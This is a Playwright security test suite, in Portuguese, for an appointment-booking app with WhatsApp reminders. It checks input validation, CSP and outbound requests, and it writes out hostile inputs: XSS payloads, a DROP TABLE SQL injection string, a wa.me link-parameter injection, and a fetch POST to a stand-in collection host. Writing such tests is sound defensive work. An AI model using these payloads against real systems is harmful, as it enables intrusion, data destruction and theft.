import { cadastrar, expect, linhas, novaAvaliacao, test } from "./app";

const PAYLOADS_XSS = [
  `<img src=x onerror="window.__xss=1">`,
  `<script>window.__xss=1</script>`,
  `"><svg onload="window.__xss=1">`,
  `javascript:window.__xss=1`,
];

test.describe("XSS", () => {
  for (const payload of PAYLOADS_XSS) {
    test(`nome ${JSON.stringify(payload)} aparece como texto`, async ({ app, servidor }) => {
      const dialogos: string[] = [];
      app.on("dialog", (d) => {
        dialogos.push(d.message());
        void d.dismiss();
      });

      await cadastrar(app, { nome: payload, whatsapp: "21999999999" });

      await expect(linhas(app)).toHaveCount(1);
      await expect(linhas(app).first()).toContainText(payload);
      expect(await app.evaluate(() => (window as { __xss?: number }).__xss)).toBeUndefined();
      await expect(app.locator("img[src='x'], svg[onload], script:not([src])")).toHaveCount(0);
      expect(dialogos).toEqual([]);
      expect(servidor.linhas()[0]?.nome).toBe(payload);
    });
  }

  test("busca com HTML não injeta nada na página", async ({ app }) => {
    await app.getByLabel("Buscar por nome ou telefone").fill(PAYLOADS_XSS[0]!);
    await app.waitForTimeout(400);
    expect(await app.evaluate(() => (window as { __xss?: number }).__xss)).toBeUndefined();
    await expect(app.locator("img[src='x']")).toHaveCount(0);
  });
});

test.describe("SQL injection", () => {
  test("nome com SQL é gravado literalmente e a tabela continua existindo", async ({ app, servidor }) => {
    const nome = `Ana'); DROP TABLE avaliacoes;--`;
    await cadastrar(app, { nome, whatsapp: "21999999999" });

    await expect(linhas(app)).toHaveCount(1);
    expect(servidor.linhas().map((l) => l.nome)).toEqual([nome]);
  });

  test("busca com OR 1=1 e curingas do LIKE não lista tudo", async ({ app }) => {
    await cadastrar(app, { nome: "Bruno Lima", whatsapp: "21988887777" });
    await cadastrar(app, { nome: "Carla Souza", whatsapp: "21977776666" });
    await expect(linhas(app)).toHaveCount(2);

    const busca = app.getByLabel("Buscar por nome ou telefone");
    for (const termo of [`' OR '1'='1`, `%`, `_`, `" OR 1=1 --`]) {
      await busca.fill(termo);
      await expect(linhas(app)).toHaveCount(0);
    }

    await busca.fill("bruno");
    await expect(linhas(app)).toHaveCount(1);
  });
});

test.describe("Lembrete do WhatsApp", () => {
  test("nome não consegue alterar o número nem adicionar parâmetros ao link", async ({ app, servidor }) => {
    const nome = `Ana&phone=5511000000000#x?text=golpe`;
    await cadastrar(app, { nome, whatsapp: "(21) 99999-9999" });

    await app.getByRole("button", { name: `Enviar lembrete para ${nome}` }).click();
    await expect.poll(() => servidor.links.length).toBe(1);

    const url = new URL(servidor.links[0]!);
    expect(url.origin).toBe("https://wa.me");
    expect(url.pathname).toBe("/5521999999999");
    expect([...url.searchParams.keys()]).toEqual(["text"]);
    expect(url.hash).toBe("");
    expect(url.searchParams.get("text")).toContain(nome);
  });

  test("o app só pede para abrir links https://wa.me", async ({ app, servidor }) => {
    await cadastrar(app, { nome: "Diego Alves", whatsapp: "11987654321" });
    await app.getByRole("button", { name: "Enviar lembrete para Diego Alves" }).click();
    await expect.poll(() => servidor.links.length).toBe(1);
    for (const link of servidor.links) expect(link).toMatch(/^https:\/\/wa\.me\/55\d{10,11}\?text=/);
  });
});

test.describe("Validação", () => {
  test("telefone inválido e nome curto não chegam ao banco", async ({ app, servidor }) => {
    await cadastrar(app, { nome: "A", whatsapp: "abc" });

    await expect(app.getByText("O nome precisa ter pelo menos 2 letras.")).toBeVisible();
    await expect(app.getByText("Informe o WhatsApp com DDD.")).toBeVisible();
    expect(servidor.linhas()).toEqual([]);
  });

  test("nome é limitado a 100 caracteres", async ({ app, servidor }) => {
    await cadastrar(app, { nome: "x".repeat(500), whatsapp: "21999999999" });
    await expect(linhas(app)).toHaveCount(1);
    expect(String(servidor.linhas()[0]?.nome).length).toBe(100);
  });

  test("data impossível é recusada", async ({ app, servidor }) => {
    await novaAvaliacao(app).click();
    await app.locator("#campo-nome").fill("Elisa Prado");
    await app.locator("#campo-data").evaluate((el: HTMLInputElement) => {
      el.type = "text";
    });
    await app.locator("#campo-data").fill("2026-02-31");
    await app.locator("#campo-horario").fill("10:00");
    await app.locator("#campo-whatsapp").fill("21999999999");
    await app.getByRole("button", { name: "Salvar avaliação" }).click();

    await expect(app.getByText("Data inválida.")).toBeVisible();
    expect(servidor.linhas()).toEqual([]);
  });
});

test.describe("Content-Security-Policy", () => {
  test("script inline injetado no DOM não executa", async ({ app }) => {
    await app.evaluate(() => {
      const s = document.createElement("script");
      s.textContent = "window.__csp = 1";
      document.head.append(s);
    });
    expect(await app.evaluate(() => (window as { __csp?: number }).__csp)).toBeUndefined();
  });

  test("política não libera eval, scripts inline nem outros domínios", async ({ request, servidor }) => {
    const resposta = await request.get(servidor.url);
    const csp = resposta.headers()["content-security-policy"] ?? "";
    const diretivas = Object.fromEntries(
      csp.split(";").map((d) => {
        const [nome, ...valores] = d.trim().split(/\s+/);
        return [nome, valores];
      }),
    );

    expect(diretivas["default-src"]).toEqual(["'self'"]);
    expect(diretivas["script-src"]).toEqual(["'self'"]);
    expect(diretivas["frame-ancestors"]).toEqual(["'none'"]);
    expect(csp).not.toContain("unsafe-eval");
    expect(csp).not.toMatch(/https?:\/\//);
  });

  test("não envia dados para servidores externos", async ({ app }) => {
    const resultado = await app.evaluate(() =>
      fetch("https://example.com/coleta", { method: "POST", body: "dados" }).then(
        () => "enviou",
        () => "bloqueado",
      ),
    );
    expect(resultado).toBe("bloqueado");
  });

  test("não carrega scripts de outros domínios", async ({ app }) => {
    const resultado = await app.evaluate(
      () =>
        new Promise<string>((resolve) => {
          const s = document.createElement("script");
          s.src = "https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js";
          s.onload = () => resolve("carregou");
          s.onerror = () => resolve("bloqueado");
          document.head.append(s);
        }),
    );
    expect(resultado).toBe("bloqueado");
  });
});

test("a interface só conversa com a API do próprio servidor", async ({ app, servidor }) => {
  const destinos = new Set<string>();
  app.on("request", (r) => destinos.add(new URL(r.url()).origin));

  await cadastrar(app, { nome: "Fábio Rocha", whatsapp: "21999999999" });
  await app.getByRole("button", { name: "Enviar lembrete para Fábio Rocha" }).click();
  await app.getByRole("button", { name: "Excluir avaliação de Fábio Rocha" }).click();
  await app.getByRole("button", { name: "Sim, excluir" }).click();
  await expect(linhas(app)).toHaveCount(0);

  expect([...destinos]).toEqual([servidor.url]);
});
